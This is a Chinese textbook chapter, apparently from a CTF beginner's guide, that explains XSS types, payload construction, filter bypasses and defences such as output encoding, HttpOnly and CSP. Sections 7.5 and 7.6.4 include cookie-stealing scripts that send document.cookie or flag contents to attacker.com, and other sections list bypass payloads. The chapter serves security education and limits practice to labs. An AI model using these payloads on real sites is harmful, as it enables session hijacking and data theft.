# 第 7 章 XSS 跨站脚本

## 本章目标

读完这一章，你将能够：

- 理解 XSS 的本质："用户输入被当成网页代码执行了"
- 区分反射型、存储型、DOM 型三种 XSS
- 手工构造 XSS payload，验证漏洞存在
- 理解 XSS 在 CTF 中的常见考法（偷 Cookie、钓鱼、绕过过滤）
- 掌握 XSS 的基本防御方法

> ⚠️ **法律红线**：本章所有 XSS 测试仅限 DVWA / sqli-labs 等自建靶场或授权环境。对真实站点注入脚本、窃取 Cookie 属违法行为。

> 如果说 SQL 注入是"骗数据库"，XSS 就是"骗浏览器"。它的危害同样巨大，而且是理解很多 Web 漏洞（CSRF、会话劫持）的基础。

---

## 7.1 一个生活类比：被篡改的公告栏

想象小区有个公告栏，物业每隔一段时间贴一张新通知。但通知的内容是**居民自己提交的**——物业只是把居民写的东西抄上去。

正常情况下，居民写："今晚停水"。物业抄上去，大家看到通知。

但如果坏人在提交内容时写："大家把家门钥匙交到xx处"——如果物业**不加辨别地照抄**，这张假通知就会被所有人当真。

**XSS 就是这个道理**：网站把用户输入直接显示到网页上，如果输入里藏了浏览器能执行的脚本（JavaScript），这些脚本就会在其他访问者的浏览器里运行——相当于坏人在公告栏上贴了"假通知"，所有看到的人都会中招。

**核心一句话**：**用户输入被当成网页代码（HTML/JS）执行了，而不只是当成文字显示。**

---

## 7.2 JavaScript 基础：XSS 的"弹药"

XSS 利用的是浏览器执行 JavaScript 的能力。你不需要精通 JS，认识几个"弹药"就够：

```javascript
<script>alert(1)</script>              <!-- 弹窗，最经典的验证 payload -->
<script>alert(document.cookie)</script><!-- 弹出当前 Cookie（偷 Cookie 的基础） -->
<img src=x onerror=alert(1)>            <!-- 图片加载失败时触发 JS -->
<svg onload=alert(1)>                   <!-- SVG 加载时触发 -->
<a href="javascript:alert(1)">click</a><!-- 链接里藏 JS -->
```

**为什么用 `alert(1)` 验证**？因为它无害又明显——弹出一个框就说明脚本执行了。CTF 里验证 XSS 存在，通常就用 `alert(1)` 或 `alert("xss")`。真正利用时才会换成偷 Cookie 等恶意代码。

**小白问：为什么有 `<img onerror>` 这种不用 `<script>` 的 payload？**
> 因为很多网站会过滤 `<script>` 标签。攻击者就用别的"能执行 JS 的标签/属性"绕过——`onerror`、`onload` 这类叫**事件处理器**，在特定事件（加载失败、加载完成、鼠标移动等）时触发 JS。这是 XSS 绕过过滤的核心手段。

---

## 7.3 三种 XSS

### 7.3.1 反射型 XSS（Reflected）

**特点**：恶意脚本在**一次请求**里传入，服务器"反射"回页面，当场执行，不存储。通常需要诱导受害者点击一个特制链接。

**流程**：
```
攻击者构造链接 http://site.com/search?q=<script>alert(1)</script>
→ 诱导受害者点击
→ 服务器把 q 参数内容原样放进了搜索结果页
→ 受害者的浏览器执行了脚本
```

**CTF 里的样子**：一个搜索框或参数，你输入 `alert(1)` 的 payload，页面弹窗——说明存在反射型 XSS。

**实战例子**：

```php
<?php
$q = $_GET['q'];
echo "搜索结果：" . $q;   // 直接输出用户输入，没做任何处理
?>
```

访问 `?q=<script>alert(1)</script>`，服务器输出：

```html
搜索结果：<script>alert(1)</script>
```

浏览器看到 `<script>` 就执行，弹窗。

### 7.3.2 存储型 XSS（Stored）

**特点**：恶意脚本被**存进数据库**，每个访问该页面的用户都会中招。危害远大于反射型。

**典型场景**：留言板、评论区、用户昵称。攻击者在留言里写 `<script>...</script>`，留言被存进数据库，之后所有人打开留言板都会执行这段脚本。

**CTF 里的样子**：一个留言板，你提交带 payload 的留言，刷新页面后弹窗——存储型 XSS。因为脚本被存下来了，题目常要求"让 bot（自动访问的机器人）触发你的 XSS"，从而偷到 bot 的 Cookie 里的 flag。

### 7.3.3 DOM 型 XSS

**特点**：漏洞在**前端 JavaScript**里，服务器返回的 HTML 本身没问题，是浏览器端 JS 把用户输入写进页面时出了问题。

```javascript
// 前端 JS
var hash = location.hash.substring(1);
document.write("Hello " + hash);   // 把 URL 片段直接写进页面
```

访问 `http://site.com/#<img src=x onerror=alert(1)>`，前端 JS 把它写进页面，触发 XSS。服务端完全没参与——这就是 DOM 型。

**CTF 里的样子**：payload 在 URL 的 `#` 后面，或者需要看前端 JS 代码才能发现注入点。

---

## 7.4 手工探测 XSS

### 7.4.1 基本流程

1. **找输入点**：搜索框、留言板、URL 参数、表单字段、HTTP 头（UA/Referer）
2. **输入测试 payload**：先试 `<script>alert(1)</script>` 和 `<img src=x onerror=alert(1)>`
3. **看输出位置**：输入的内容显示在页面哪里？是否被转义？
4. **构造有效 payload**：根据输出环境调整

### 7.4.2 观察输出：三个关键问题

输入 `"><script>alert(1)</script>` 后，查看源代码（Ctrl+U），看它怎么被渲染：

| 输出情况 | 结论 |
|---------|------|
| `"><script>alert(1)</script>` 原样出现在 HTML 里 | 存在 XSS，直接执行 |
| `&lt;script&gt;alert(1)&lt;/script&gt;`（被 HTML 实体编码） | 被转义了，通常安全 |
| 出现在 `<input value="...">` 的属性里 | 需要跳出属性，用 `"` 闭合 |
| 出现在 `<script>var x='输入'</script>` 里 | 在 JS 上下文，需要 JS 语法闭合 |

**小白问：什么是"上下文"？为什么重要？**
> 用户输入出现在页面的不同位置（HTML 正文、标签属性、JS 代码里），需要的 payload 语法不同。比如出现在 `<input value="用户输入">` 里，你得先用 `"` 把属性闭合，再插入标签，payload 要写成 `"><script>...`。理解上下文是绕过过滤、构造有效 payload 的关键。

### 7.4.3 常见绕过技巧

网站常会过滤 `<script>`、`<` 等。绕过方法：

```
大小写混淆：    <ScRiPt>alert(1)</sCrIpT>
双写绕过：      <scr<script>ipt>alert(1)</scr</script>ipt>  （过滤一次后拼回 script）
事件处理器：    <img src=x onerror=alert(1)>   （不用 script 标签）
编码绕过：      <img src=x onerror=&#97;lert(1)>  （HTML 实体编码）
javascript 伪协议：<a href="javascript:alert(1)">x</a>
```

CTF 里 XSS 题的"过滤与绕过"是主要考点——出题人写个过滤器，你研究怎么绕过。这需要积累 payload 库，第 25 章会推荐一些资源。

---

## 7.5 XSS 的危害：能做什么

在 CTF 里，XSS 的终极目标通常是**偷取 Cookie**（里面的 flag 或会话标识）：

```javascript
<script>
// 把受害者的 Cookie 发送到攻击者的服务器
new Image().src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>
```

当管理员/bot 访问了有这段脚本的页面，它的 Cookie 就被发到攻击者服务器——如果 flag 在 Cookie 里，就拿到了。

其他危害：

| 危害 | 说明 |
|------|------|
| 会话劫持 | 偷 Cookie，冒充受害者登录 |
| 钓鱼 | 在页面上伪造登录框，骗取账号密码 |
| 网页篡改 | 修改页面内容，散布虚假信息 |
| 蠕虫传播 | 自动让更多用户中招（如早期的 Samy 蠕虫） |
| 配合 CSRF | 用 XSS 帮攻击者发起跨站请求 |

**CTF 常见玩法**：存储型 XSS + bot。你留下 payload，比赛方的 bot（一个模拟管理员的自动浏览器）会定期访问页面，触发你的 XSS，把它的 Cookie（含 flag）发给你。你需要搭一个接收服务器（第 27 章讲的平台或自己用 Python 起一个，见第 24 章）来收 flag。

---

## 7.6 XSS 的防御

### 7.6.1 输出编码（根本防御）

原则：**用户输入在输出到页面时，必须根据输出上下文做相应编码**。

| 输出位置 | 防御方法 |
|---------|---------|
| HTML 正文 | HTML 实体编码：`<` → `&lt;`，`>` → `&gt;` 等 |
| HTML 属性 | 属性值编码，用引号包裹 |
| JavaScript 代码 | JS 编码 |
| URL 参数 | URL 编码 |

现代框架（Vue/React/Angular）默认会做转义，所以它们天生对 XSS 有较强防御——这也是为什么当代 Web 里 XSS 比 SQL 注入少见。

### 7.6.2 其他防御措施

| 措施 | 作用 |
|------|------|
| **HttpOnly Cookie** | JS 读不到 Cookie，偷 Cookie 失效（见 4.5） |
| CSP（内容安全策略） | 限制页面能加载/执行哪些脚本，阻断内联脚本和外连 |
| 输入过滤 | 过滤危险标签（辅助，不能替代输出编码） |
| 输出编码 | **根本解法** |

**CTF 里的对应关系**：当你发现 `alert(1)` 弹不出来、Cookie 带 HttpOnly 时，就是出题人做了防御——这时要么换绕过手法，要么这题不是 XSS 考点。理解防御，才能知道攻击为什么失败。

---

## 7.6 深度拓展：XSS 绕过、编码与防御进阶

7.1–7.6 覆盖了 XSS 的基础。这一节深入绕过技巧和防御细节——CTF 的 XSS 题，难点几乎都在"绕过过滤"上。

### 7.6.1 理解上下文：XSS 绕过的核心

同一个 payload 在不同位置效果完全不同。**上下文（context）**指的是用户输入出现在 HTML 页面的哪个位置：

**上下文一：HTML 标签之间**

```html
<div>用户输入</div>
```

直接插标签：`<script>alert(1)</script>` 或 `<img src=x onerror=alert(1)>`。

**上下文二：HTML 属性内部**

```html
<input value="用户输入">
```

需要先闭合属性：`" onfocus=alert(1) autofocus="` 或 `"><script>alert(1)</script>`。

**上下文三：script 标签内部**

```html
<script>var name = '用户输入';</script>
```

需要先闭合 JS 字符串：`'; alert(1); //`。

**上下文四：JavaScript 字符串在属性里**

```html
<a href="javascript:用户输入">...</a>
```

直接写 JS 代码：`alert(1)`。

**判断方法**：输入一个独特字符串（如 `test123`），查看源代码，看它出现在哪里，然后用对应的闭合方式构造 payload。**这是 XSS 解题的第一步，比背 payload 更重要。**

### 7.6.2 常见过滤与绕过手法

出题人常过滤 `<script>`、`onerror`、`<`、`>`、`alert` 等。绕过方法：

| 过滤 | 绕过 |
|------|------|
| `<script>` | `<img src=x onerror=...>`、`<svg onload=...>`、`<iframe srcdoc=...>` |
| `alert` | `prompt(1)`、`confirm(1)`、`(...)[0].constructor('aler'+'t')(1)` |
| 括号 `()` | `` ` `` 反引号、编码 |
| 引号 | 不用引号：`<svg onload=alert(1)>`（数字不需引号） |
| `<` `>` | 用 HTML 实体编码（如果输出点会二次解码） |
| 空格 | `/` 或 `%0a` 分隔：`<img/src=x/onerror=alert(1)>` |
| 关键词黑名单 | 大小写：`<ScRiPt>`；双写：`<scr<script>ipt>` |

### 7.6.3 编码在 XSS 中的妙用

浏览器的 HTML 解析会对实体编码先解码，再执行。利用这一点：

```html
<!-- 实体编码的 <script> -->
&lt;script&gt;alert(1)&lt;/script&gt;
<!-- 如果输出点不转义，浏览器会把 &lt; 解成 <，然后执行 -->
```

```javascript
// JS 里的 unicode 编码
\u0061lert(1)   // \u0061 = a
```

**注意**：编码绕过的前提是"输出点会解码"——如果服务器用 `htmlspecialchars` 把 `&` 也编码成 `&amp;`，就绕不过。要观察实际输出。

### 7.6.4 偷 Cookie 的完整 payload

CTF 里拿到 XSS 后，典型目标是把受害者的 Cookie 外带：

```javascript
<script>
// 方法1：图片请求外带
new Image().src = 'http://attacker.com/steal?c=' + encodeURIComponent(document.cookie);

// 方法2：fetch
fetch('http://attacker.com/steal?c=' + document.cookie);

// 方法3：location 跳转
location = 'http://attacker.com/steal?c=' + document.cookie;
</script>
```

**配合第 24.8 节的 Flask 接收服务器**，就能收到 flag。

**如果 Cookie 有 HttpOnly**：JS 读不到它，偷 Cookie 失效。这时要换思路：
- 用 XSS 发起"站内请求"（代受害者操作），如直接读页面上显示的 flag（很多 CTF bot 的 flag 在页面 DOM 里，不在 Cookie）
- 钓鱼：伪造登录框骗取密码

```javascript
// 读取页面上flag元素的内容并外带
new Image().src = 'http://attacker.com/?d=' + document.getElementById('flag').innerText;
```

### 7.6.5 CSP：XSS 的克星

CSP（Content Security Policy，内容安全策略）是服务器通过 HTTP 头告诉浏览器"只能加载哪些来源的脚本"：

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

这表示只允许加载同源脚本，内联 `<script>` 和外部攻击脚本都被拦截。

**CTF 里的 CSP 绕过**（了解）：
- 如果 CSP 允许 `unsafe-inline`，内联脚本可执行
- 如果有 JSONP 端点在白名单里，可利用它绕过
- 用 `<base>` 标签劫持相对路径的脚本加载
- CSP 配置错误（如白名单包含 `*`）可绕过

**如果一道 XSS 题怎么都弹不窗，先检查响应头有没有 CSP**——可能有这个"拦路虎"。

### 7.6.6 XSS 与 CSRF 的区别

新手常混淆这两个：

| | XSS | CSRF |
|---|-----|------|
| 本质 | 执行恶意脚本 | 冒用用户身份发请求 |
| 需要 | 注入脚本到页面 | 诱导用户访问恶意链接 |
| 目标 | 偷数据/控制页面 | 让用户"被操作"（如转账） |
| 防御 | 输出编码、CSP、HttpOnly | CSRF Token、SameSite Cookie |

**联系**：XSS 可以用来实施 CSRF（用脚本自动发请求），所以 XSS 漏洞往往更危险。

### 7.6.7 找 XSS 注入点的技巧

1. **所有输入点都试**：URL 参数、表单、搜索框、留言、昵称、HTTP 头（UA/Referer）
2. **看输出位置**：用独特字符串定位，判断上下文
3. **注意"不显示"的输入**：有些输入不显示在页面上，但显示在管理后台——这时要模拟 bot 的视角
4. **DOM 型专项**：看前端 JS 代码，找 `innerHTML`、`document.write`、`eval` 等危险函数的使用

---

## 7.7 本章总结

| 知识点 | 核心要点 |
|--------|---------|
| XSS 本质 | 用户输入被当成 HTML/JS 代码执行 |
| 验证 payload | `alert(1)`、`<img src=x onerror=alert(1)>` |
| 三种类型 | 反射型（一次请求）、存储型（存数据库）、DOM 型（前端 JS） |
| 上下文 | 输出位置决定 payload 语法（HTML/属性/JS） |
| 绕过 | 大小写、双写、事件处理器、编码、javascript 伪协议 |
| 危害 | 偷 Cookie、钓鱼、篡改、蠕虫；CTF 常配 bot 偷 flag |
| 防御 | **输出编码（根本）** + HttpOnly + CSP |

---

## 本章练习

1. 在 DVWA 的 Reflective XSS 页面（Low 等级），输入 `<script>alert(1)</script>`，确认弹窗。
2. 把等级调到 Medium，看看 `<script>` 被怎么处理，尝试用大小写或 `<img onerror>` 绕过。
3. 在 Stored XSS（Low）留言板提交 `<img src=x onerror=alert(document.cookie)>`，刷新看效果。
4. 找一道 CTF 的存储型 XSS 题（BuuCTF 上有），尝试让 bot 触发你的 payload。
5. 查看一个现代网站（如用 React/Vue 的），试着在搜索框输入 `<script>alert(1)</script>`，观察是否被转义——体会框架的默认防御。
6. 思考：HttpOnly 为什么能防住"偷 Cookie 型"XSS？如果 flag 不在 Cookie 而在页面某处，又该怎么拿？

---

**下一章预告**：SQL 注入和 XSS 都是"用输入骗系统"，文件上传则是"直接传一个恶意文件上去"。第 8 章讲文件上传漏洞——CTF 里花样最多的考点之一，绕过技巧层出不穷。
